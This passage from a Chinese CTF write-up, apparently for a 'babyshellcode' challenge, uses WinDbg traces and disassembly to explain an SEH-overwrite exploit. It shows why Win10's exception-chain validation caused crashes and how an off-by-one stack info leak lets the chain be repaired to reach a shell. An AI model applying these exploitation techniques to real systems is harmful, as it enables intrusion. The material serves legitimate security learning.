    0:000> p
    eax=00000000 ebx=00000000 ecx=73a791c6 edx=770b6d8d esi=00000000 edi=00000000
    eip=770b6d74 esp=0023f3e4 ebp=0023f400 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!ExecuteHandler2+0x21:
    770b6d74 8b4d18          mov     ecx,dword ptr [ebp+18h] ss:0023:0023f418={scmgr!getshell_test (72b61100)}
    0:000> p
    eax=00000000 ebx=00000000 ecx=72b61100 edx=770b6d8d esi=00000000 edi=00000000
    eip=770b6d77 esp=0023f3e4 ebp=0023f400 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!ExecuteHandler2+0x24:
    770b6d77 ffd1            call    ecx {scmgr!getshell_test (72b61100)}
    0:000> t
    eax=00000000 ebx=00000000 ecx=72b61100 edx=770b6d8d esi=00000000 edi=00000000
    eip=72b61100 esp=0023f3e0 ebp=0023f400 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    scmgr!getshell_test:
    72b61100 68f420b672      push    offset scmgr!getshell_test+0xff4 (72b620f4)
到这里利用就完整了吗？我们在win7下没问题了，但是在目标却一直crash掉，实在是搞不明白，后来才知道，我们用错了环境！原来目标是Win10…
Win10的SafeSEH和Win7又有所区别，这里要提到SEH的两个域，一个是prev域和handler域，prev域会存放一个指向下一个seh
chain的栈地址，handler域就是存放的seh handler，而Win10里面多了一个Check函数
**ntdll!RtlpIsValidExceptionChain** ，这个函数会去获得当前seh chain的prev域的值。
    0:000> p//这里我们覆盖prev为0x61616161
    eax=030fd000 ebx=03100000 ecx=030ff7ac edx=6fdd1100 esi=030ff278 edi=030fd000
    eip=7771ea79 esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz na pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
    ntdll!RtlpIsValidExceptionChain+0x2b:
    7771ea79 8b31            mov     esi,dword ptr [ecx]  ds:002b:030ff7ac=61616161
    0:000> p
    eax=030fd000 ebx=03100000 ecx=030ff7ac edx=6fdd1100 esi=61616161 edi=030fd000
    eip=7771ea7b esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz na pe nc
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
    ntdll!RtlpIsValidExceptionChain+0x2d:
    7771ea7b 83feff          cmp     esi,0FFFFFFFFh
    0:000> p
    eax=030fd000 ebx=03100000 ecx=030ff7ac edx=6fdd1100 esi=61616161 edi=030fd000
    eip=7771ea7e esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz ac po cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
    ntdll!RtlpIsValidExceptionChain+0x30:
    7771ea7e 740f            je      ntdll!RtlpIsValidExceptionChain+0x41 (7771ea8f) [br=0]
随后，会去和seh表里存放的prev域的值进行比较。
    0:000> p
    eax=030ff7b4 ebx=03100000 ecx=61616161 edx=6fdd1100 esi=61616161 edi=030fd000
    eip=7771ea8a esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz ac po cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
    ntdll!RtlpIsValidExceptionChain+0x3c:
    7771ea8a 8d53f8          lea     edx,[ebx-8]
    0:000> p
    eax=030ff7b4 ebx=03100000 ecx=61616161 edx=030ffff8 esi=61616161 edi=030fd000
    eip=7771ea8d esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz ac po cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
    ntdll!RtlpIsValidExceptionChain+0x3f:
    7771ea8d ebd6            jmp     ntdll!RtlpIsValidExceptionChain+0x17 (7771ea65)
    0:000> p
    eax=030ff7b4 ebx=03100000 ecx=61616161 edx=030ffff8 esi=61616161 edi=030fd000
    eip=7771ea65 esp=030ff1bc ebp=030ff1c8 iopl=0         nv up ei pl nz ac po cy
    cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000213
    ntdll!RtlpIsValidExceptionChain+0x17:
    7771ea65 3bc1            cmp     eax,ecx//ecx寄存器存放的是栈里被覆盖的，eax存放的是正常的pointer to next chain
可以看到这里检测是不通过的，因此造成了crash，所以，我们需要对seh chain进行fix，把pointer to next
chain修改成下一个seh
chain的栈地址，这就需要我们获取当前的栈地址，栈地址是自动动态申请和回收的，和堆不一样，因此每次栈地址都会发生变化，我们需要一个stack info
leak。
于是我们在程序中找到了这样一个stack info leak的漏洞，开头有个stack info leak，在最开始的位置。
      v1 = getchar();
      do
      {
        if ( v1 == 10 )
          break;
        *((_BYTE *)&v5 + v0++) = v1;
        v1 = getchar();
      }
      while ( v0 != 300 );
      sub_4017C0("hello %sn", &v5);
    0:000> g//一字节一字节写入，esi是计数器，ebp-18h是指向拷贝目标的指针
    Breakpoint 0 hit
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000000 edi=005488a8
    eip=000a16a4 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    babyshellcode+0x16a4:
    000a16a4 884435e8        mov     byte ptr [ebp+esi-18h],al  ss:0023:0036f920=00
    0:000> p
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000000 edi=005488a8
    eip=000a16a8 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    babyshellcode+0x16a8:
    000a16a8 46              inc     esi
    0:000> p//获取下一字节
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=00000061 esi=00000001 edi=005488a8
    eip=000a16a9 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz na po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
    babyshellcode+0x16a9:
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Userssh1Desktopucrtbase.DLL - 
    000a16a9 ff15e4300a00    call    dword ptr [babyshellcode+0x30e4 (000a30e4)] ds:0023:000a30e4={ucrtbase!getchar (5740b260)}
    0:000> p//判断长度
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    eip=000a16af esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    babyshellcode+0x16af:
    000a16af 81fe2c010000    cmp     esi,12Ch
    0:000> p
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    eip=000a16b5 esp=0036f90c ebp=0036f938 iopl=0         nv up ei ng nz ac po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
    babyshellcode+0x16b5:
    000a16b5 75e9            jne     babyshellcode+0x16a0 (000a16a0)         [br=1]
    0:000> p//判断是否是回车
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    eip=000a16a0 esp=0036f90c ebp=0036f938 iopl=0         nv up ei ng nz ac po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
    babyshellcode+0x16a0:
    000a16a0 3c0a            cmp     al,0Ah
    0:000> p
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    eip=000a16a2 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    babyshellcode+0x16a2:
    000a16a2 7413            je      babyshellcode+0x16b7 (000a16b7)         [br=0]
    0:000> p//继续写入
    Breakpoint 0 hit
    eax=00000061 ebx=7ffde000 ecx=574552e0 edx=574552e0 esi=00000001 edi=005488a8
    eip=000a16a4 esp=0036f90c ebp=0036f938 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    babyshellcode+0x16a4:
    000a16a4 884435e8        mov     byte ptr [ebp+esi-18h],al  ss:0023:0036f921=00
这里判断的长度是0x12C，也就是300，但实际上拷贝目标ebp-18很短，而esi会不断增加，而没有做控制，最关键的是这个过程。
    .text:004016A4 ; 20:     *((_BYTE *)&v5 + v0++) = v1;
    .text:004016A4                 mov     byte ptr [ebp+esi+var_18], al
    .text:004016A8 ; 21:     v1 = getchar();
    .text:004016A8                 inc     esi//key！！
    .text:004016A9                 call    ds:getchar
    .text:004016AF ; 23:   while ( v0 != 300 );
    .text:004016AF                 cmp     esi, 12Ch
这里是在赋值结束之后，才将esi自加1，然后才去做长度判断，然后再跳转去做是否回车的判断，如果回车则退出，也就是说，这里会多造成4字节的内存泄漏，我们来看一下赋值过程中的内存情况。
    0:000> dd ebp-18 l7
    0036f920  00000061 00000000 00000000 00000000
    0036f930  00000000 1ea6b8ab 0036f980
可以看到，在0036f920地址偏移+0x18的位置存放着一个栈地址，也就是说，如果我们让name的长度覆盖到0036f938位置的时候，多泄露的4字节是一个栈地址，这样我们就可以用来fix
seh stack了。
有了这个内存泄漏，我们就可以重新构造栈布局了，栈布局如下：
这样，结合之前我们的整个利用过程，完成整个利用链，最后完成shell交互。